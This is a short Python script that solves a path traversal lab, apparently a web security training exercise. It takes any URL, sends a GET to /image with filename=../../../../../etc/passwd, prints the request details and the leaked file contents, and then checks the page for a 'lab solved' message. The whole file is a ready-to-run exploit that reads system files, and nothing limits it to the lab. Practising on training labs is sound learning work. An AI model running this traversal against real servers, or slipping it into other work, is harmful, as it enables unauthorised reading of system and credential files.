import sys
import re
import requests

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def perform_lfi(url):

    print()
    print(f"[*] Sending request as GET {url}/image?filename=../../../../../etc/passwd")
    print()

    url = url + "/image"

    data = {
        "filename": "../../../../../etc/passwd"
    }

    response = requests.get(url, params=data)

    print()
    print(f"Request Method: {response.request.method}")
    print(f"Request Url: {response.request.url}")
    print(f"Request Headers: {response.request.headers}")
    print()

    print("Response output:")
    print(response.text)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: python file.py https://website.net")
    else:
        url = sys.argv[1].strip("/")
        perform_lfi(url)
        verify_if_lab_solved(url)
